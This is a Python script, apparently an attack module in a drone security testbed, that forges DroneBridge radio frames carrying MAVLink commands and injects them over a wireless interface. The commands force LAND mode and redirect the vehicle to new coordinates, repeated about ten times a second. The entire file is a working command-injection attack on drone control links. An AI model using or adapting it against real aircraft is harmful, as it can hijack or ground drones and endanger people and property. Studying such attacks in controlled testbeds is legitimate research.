#!/usr/bin/env python3
"""
T7 Frame Injection — Inject crafted DroneBridge frames with MAVLink payloads.

Builds valid DroneBridge Raw Protocol v2 frames containing MAVLink
COMMAND_LONG messages (e.g. SET_MODE to LAND) and injects them via wlan2.
Expected drone behavior: waypoint deviation, unexpected mode changes.

Frame structure:
    RadioTap (variable) + DB Header (10 bytes) + MAVLink payload

Usage (standalone test):
    sudo python3 frame_injection.py --interface wlan2
    
Normally started/stopped by the orchestrator.
"""

import argparse
import signal
import struct
import time

keep_running = True


def handle_signal(sig, frame):
    global keep_running
    keep_running = False


def build_mavlink_v2_set_mode(target_system=1, target_component=1,
                               mode=9):
    """Build a MAVLink v2 COMMAND_LONG message for MAV_CMD_DO_SET_MODE.
    
    Mode 9 = LAND in ArduCopter.
    MAVLink v2 header: FD len seq sys comp msgid(3 bytes) payload crc
    """
    from pymavlink.dialects.v20 import ardupilotmega as mav

    # Create a minimal MAVLink instance for message encoding
    m = mav.MAVLink(None, srcSystem=255, srcComponent=0)
    msg = m.command_long_encode(
        target_system, target_component,
        mav.MAV_CMD_DO_SET_MODE,
        0,                  # confirmation
        float(mav.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED),  # param1: base mode flags
        float(mode),        # param2: custom (flight) mode
        0, 0, 0, 0, 0      # param3-7
    )
    return msg.pack(m)


def build_mavlink_v2_set_position(target_system=1, target_component=1,
                                   lat_offset=0.001, lon_offset=0.001):
    """Build a MAVLink v2 SET_POSITION_TARGET_GLOBAL_INT message.
    
    Attempts to redirect the drone to a different position.
    """
    from pymavlink.dialects.v20 import ardupilotmega as mav

    m = mav.MAVLink(None, srcSystem=255, srcComponent=0)
    # Target position: Canberra + offset
    lat = int((-35.363261 + lat_offset) * 1e7)
    lon = int((149.165230 + lon_offset) * 1e7)

    msg = m.set_position_target_global_int_encode(
        0,                  # time_boot_ms
        target_system, target_component,
        mav.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
        0b0000111111111000,  # type_mask: use only lat/lon/alt
        lat, lon,
        50,                 # alt (m above home; GLOBAL_INT would be AMSL)
        0, 0, 0,            # vx vy vz
        0, 0, 0,            # afx afy afz
        0, 0                # yaw, yaw_rate
    )
    return msg.pack(m)


def build_db_frame(payload: bytes, direction=0x01, comm_id=200,
                   port=1, seq_num=0):
    """Wrap a MAVLink payload in a DroneBridge Raw Protocol v2 frame.
    
    Frame: RadioTap + FCF/Duration(4) + direction(1) + comm_id(1) 
           + port(1) + payload_len(2) + seq_num(1) + payload
    """
    from scapy.all import RadioTap

    db_header = struct.pack('<4sBBBHB',
        b'\x08\x00\x00\x00',   # FCF + Duration
        direction,
        comm_id,
        port,
        len(payload),
        seq_num & 0xFF
    )

    radiotap = bytes(RadioTap())
    return radiotap + db_header + payload


def run_injection(interface: str):
    from scapy.all import sendp

    # Pre-build attack payloads
    payloads = [
        ("SET_MODE_LAND", build_mavlink_v2_set_mode(mode=9)),
        ("SET_POSITION", build_mavlink_v2_set_position()),
    ]

    seq = 0
    frame_count = 0

    while keep_running:
        for name, mavlink_bytes in payloads:
            if not keep_running:
                break

            frame = build_db_frame(mavlink_bytes, seq_num=seq)
            sendp(frame, iface=interface, verbose=False, count=1)
            seq = (seq + 1) & 0xFF
            frame_count += 1

            if frame_count % 100 == 0:
                print(f"[FRAME_INJ] {frame_count} frames sent", flush=True)

            # ~10 injections per second
            time.sleep(0.1)

    print(f"[FRAME_INJ] Stopped. Total frames: {frame_count}", flush=True)


def main():
    parser = argparse.ArgumentParser(description="T7 Frame Injection")
    parser.add_argument("--interface", default="wlan2")
    parser.add_argument("--mission-id", default="manual")
    args = parser.parse_args()

    signal.signal(signal.SIGTERM, handle_signal)
    signal.signal(signal.SIGINT, handle_signal)

    print(f"[FRAME_INJ] Starting on {args.interface}", flush=True)
    run_injection(args.interface)


if __name__ == "__main__":
    main()